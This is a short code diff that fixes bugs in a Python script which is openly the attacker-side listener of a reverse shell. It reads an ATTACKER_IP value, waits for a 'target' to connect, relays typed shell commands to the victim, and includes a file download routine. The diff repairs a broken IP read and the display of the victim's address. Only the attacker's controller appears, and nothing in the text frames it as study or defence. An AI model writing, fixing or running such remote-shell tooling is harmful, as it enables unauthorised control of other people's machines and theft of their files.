@@ -1,6 +1,6 @@
 import socket, json, os
 
-ATTACKER_IP = open("ip.txt").read().close()
+ATTACKER_IP = open("ip.txt").read().strip()
 
 def robust_send(data):
 	jsondata = json.dumps(data)
@@ -33,7 +33,7 @@ def download(file):
 
 def target_communicate():
 	while True:
-		command = input(f"* Shell~{ip}: ")
+		command = input(f"* Shell~{ip[0]}: ")
 		robust_send(command)
 		if command == "quit":
 			break
@@ -58,6 +58,6 @@ print("[+] Listening for incoming connections...")
 s.listen(5)
 target, ip = s.accept()
 
-print(f"[+] Target connected from {ip}!")
+print(f"[+] Target connected from {ip[0]}!")
 
 target_communicate()
